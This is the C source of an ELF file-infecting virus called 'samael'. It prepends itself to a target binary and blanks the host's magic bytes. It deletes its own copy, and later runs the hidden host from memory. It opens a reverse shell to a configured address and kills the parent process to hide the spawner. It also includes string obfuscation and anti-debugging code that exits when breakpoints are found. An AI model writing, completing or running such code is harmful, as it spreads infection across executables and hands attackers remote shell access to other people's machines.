#include "samael.h"

int main(int argc, char** argv){
  // if infection target is not infected infect it
  // else execute the infected host file
  if(!is_infected(infection_target)){
    FILE* host = fopen(infection_target, "rb+");
    FILE* parasite = fopen(argv[0], "rb");
    infect(host, parasite);
    fclose(host);
    fclose(parasite);
  }else{
    FILE* infected = fopen(argv[0], "rb");
    execute_host(infected, argv, environ);
    reverse_shell();
  }
}

long elf_size(FILE* f){
  // calculates the size of an elf by adding
  // the byte offset of the section header
  // with the byte size of the section entries
  // multiplied by the number of entries
  Elf64_Ehdr header;
  fread(&header, 1, sizeof(Elf64_Ehdr), f);
  fseek(f, 0, SEEK_SET);
  return header.e_shoff + (header.e_shentsize * header.e_shnum);
}

int is_infected(char* f){
  // determines if the file f is infected
  // by subtracting the elf_size calculated
  // based on the section header and entries
  // from the final byte offset of the file.
  // if they are not equal size then the file
  // must be infected
  FILE* file = fopen(f, "rb");
  if(file){
    long e_size = elf_size(file);
    fseek(file, 0, SEEK_END);
    long f_size = ftell(file);
    fclose(file);
    if(f_size - e_size != 0){
      return 1;
    }
  }
  return 0;
}

// prepend samael to target host binary
void infect(FILE* h, FILE* p){
  long h_size = elf_size(h);
  long p_size = elf_size(p);
  char* h_buffer = (char*)malloc(sizeof(char) * h_size);
  char* p_buffer = (char*)malloc(sizeof(char) * p_size);

  // the use of 0xFF is arbitary, 256 characters should suffice for common file name length
  char file_link[0xFF];
  char file_name[0xFF];

  // read host and parasite into their respective buffers
  fread(h_buffer, sizeof(char), h_size, h);
  fread(p_buffer, sizeof(char), p_size, p);

  // replaces the host elf magic number with O's
  for(int i = 0; i < 4; ++i){
    h_buffer[i] = 0;
  }

  // write parasite to the beginning of the host file then write host back to itself
  fseek(h, 0, SEEK_SET);
  fwrite(p_buffer, sizeof(char), p_size, h);
  fwrite(h_buffer, sizeof(char), h_size, h);

  // get file name of parasite and delete it
  sprintf(file_link, "/proc/self/fd/%d", fileno(p));
  ssize_t len = readlink(file_link, file_name, sizeof(file_name));
  file_name[len] = '\0'; 
  remove(file_name);
}

// execute host binary appended to samael
void execute_host(FILE* f, char** argv, char** envp){
  long p_size = elf_size(f);
  fseek(f, p_size, SEEK_SET);
  long h_size = elf_size(f);
  char host[h_size];
  fseek(f, p_size, SEEK_SET);
  fread(host, sizeof(char), h_size, f);

  // put host's elf magic number back
  host[0] = ELFMAG0;
  host[1] = ELFMAG1;
  host[2] = ELFMAG2;
  host[3] = ELFMAG3;

  // create a file in memory and write the host to it
  int fd = memfd_create("", 1);
  write(fd, host, h_size);

  // fork the process to execute the host file
  pid_t pid;
  if((pid = fork()) == 0){
    fexecve(fd, argv, envp);
  }else{
    wait(NULL);
  }
}

void reverse_shell(){ 
  int socket_fd;
  int connection = -1;
  int pid;
  struct sockaddr_in server;  

  // set up socket for connection
  socket_fd = socket(AF_INET, SOCK_STREAM, 0);
  server.sin_family = AF_INET;
  server.sin_port = htons(port);
  server.sin_addr.s_addr = inet_addr(addr);

  if((pid = fork()) == 0){
    // loop until connection is established
    while(connection < 0){
      sleep(5);
      connection = connect(socket_fd, (struct sockaddr *)&server, sizeof(struct sockaddr));
    }

    // copy stdin, stdout & stderr to client socket
    dup2(socket_fd,0);
    dup2(socket_fd,1);
    dup2(socket_fd,2);
    
    execve("/bin/sh", NULL, NULL); // start shell
  }else{
    exit(0); // kill parent process to hide who spawned shell 
  }
}

// WIP, minimal brainfuck interpreter to return char* to a hidden string
char* hidden_string(char* c){
  char* head = (char*)calloc(0xFF, sizeof(char)); // calloc'd memory is not freed so this does introduce a memory leak
  char* start = head;
  
  for(int i = 0 ; c[i] != '\0' ; ++i){
    if(c[i] == '>'){
      ++head;
    }else if(c[i] == '+'){
      ++*head;
    }// <, -, [ && ] to be implemented when brainfuck code generation uses them
  }
  return start;
}

// scans executable code segments for int3 instructions, 0xCC, and exits if one is found
void detect_breakpoints(){
  int counter = 0;
  char* start = (char*)&_start; // starting address of the .text section
  char* end = (char*)&__etext;  // starting address of the .fini section

  // use half of 0xCC to not hardcode a 0xCC 
  volatile unsigned char int3 = 0x66;

  // check each byte of executable code for a possible int3, 0xCC, if so increment counter
  while(start != end){                                     
    if(((*(volatile unsigned*)start++) & 0xFF) == (int3 * 2)){     
      counter++;
    }
  }
  if(counter != count){
    exit(0); // exit program if a breakpoint is detected, maybe adjust to delete executable file instead??
  }
}
